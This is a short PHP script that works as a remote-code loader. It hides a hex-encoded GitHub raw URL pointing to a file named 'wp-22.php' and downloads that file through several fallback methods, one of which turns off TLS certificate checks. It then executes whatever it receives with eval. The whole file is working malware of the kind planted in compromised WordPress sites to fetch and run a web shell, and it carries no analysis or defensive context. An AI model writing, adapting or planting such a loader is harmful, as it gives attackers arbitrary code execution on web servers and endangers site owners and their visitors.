<?pHp
$hu = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f756e616d657869642f636f6c6c6563742f6d61696e2f782f77702d32322e706870';
function h2s($h) {
    $s = '';
    for ($i = 0; $i < strlen($h) - 1; $i += 2) {
        $s .= chr(hexdec($h[$i].$h[$i+1]));
    }
    return $s;
}
$u = h2s($hu);
function df($u) {
    if (ini_get('allow_url_fopen')) {
        if ($d = @file_get_contents($u)) return $d;
    }
    if (function_exists('curl_init')) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        $d = curl_exec($c);
        curl_close($c);
        if ($d) return $d;
    }
    $f = @fopen($u, 'r');
    if ($f) {
        $d = '';
        while ($b = fread($f, 8192)) $d .= $b;
        fclose($f);
        return $d;
    }
    return false;
}
$sc = df($u);
if ($sc === false) die("F");
eval('?>'.$sc);
?>
